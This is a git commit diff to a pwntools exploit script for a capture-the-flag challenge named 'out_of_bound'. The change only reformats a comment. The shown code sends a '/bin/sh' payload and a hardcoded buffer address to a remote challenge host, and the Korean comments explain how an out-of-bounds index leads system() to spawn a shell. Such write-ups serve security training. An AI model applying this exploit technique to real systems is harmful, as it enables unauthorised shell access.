5d4fde9bf38d3f107710b69a254234d70e04960e
Juhyeong Kim <kesnt8892@gmail.com>
2024-08-16 07:04:01 +0000

    out_of_bound solved

--- solved/out_of_bound/ex.py
+++ solved/out_of_bound/ex.py
@@ -5,8 +5,7 @@ context.arch = "i386"
 p = remote("host3.dreamhack.games", 14448)
 
 payload = b"/bin/sh" + b"\x00"  # 8바이트를 맞춰주기 위해 b'\x00'을 추가해줘야함
-payload += p32(0x804A0AC)
-# name의 주소 (system의 인자에는 "/bin/sh" 문자열 자체가 아닌 해당 문자열의 주소가 들어가야함)
+payload += p32(0x804A0AC) # name의 주소 (system의 인자에는 "/bin/sh" 문자열 자체가 아닌 해당 문자열의 주소가 들어가야함)
 p.send(payload)
 
 # &name - &command = 76 이므로, 32-bit에서 char *의 크기인 4byte만큼 index 19차이가 나고, name의 주소는 8byte 뒤에 입력되어 있어서 4byte만큼 2번 더 가야함
